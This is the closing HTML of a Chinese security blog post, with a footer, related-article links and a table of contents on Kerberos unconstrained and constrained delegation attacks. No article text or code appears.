+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-14/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-14/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 基于域信任关系的域攻击"
+                        data-key="intranet-14" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">基于域信任关系的域攻击</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-11/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-11/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post DCShadow 攻击"
+                        data-key="intranet-11" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DCShadow 攻击</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-10/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-10/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post DCSync 攻击"
+                        data-key="intranet-10" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DCSync 攻击</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-12/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-12/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Windows 认证"
+                        data-key="intranet-12" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Windows 认证</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/intranet-15/">
+        
+        
+            <div class="article-image">
+                <img src="/p/intranet-15/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 内网横向"
+                        data-key="intranet-15" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内网横向</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#定义">定义</a>
+      <ol>
+        <li><a href="#委派">委派</a></li>
+        <li><a href="#多跳认证和委派的流程">多跳认证和委派的流程</a></li>
+        <li><a href="#委派分类">委派分类</a></li>
+      </ol>
+    </li>
+    <li><a href="#非约束委派">非约束委派</a>
+      <ol>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#实战">实战</a>
+          <ol>
+            <li><a href="#非约束委派查找">非约束委派查找</a></li>
+            <li><a href="#利用-管理员模拟访问">利用-管理员模拟访问</a></li>
+            <li><a href="#利用-spooler-printer-bug">利用-Spooler Printer Bug</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#约束性委派">约束性委派</a>
+      <ol>
+        <li><a href="#原理-1">原理</a></li>
+        <li><a href="#实战-1">实战</a>
+          <ol>
+            <li><a href="#约束委派查找">约束委派查找</a></li>
+            <li><a href="#利用">利用</a></li>
+            <li><a href="#委派服务受限">委派服务受限</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
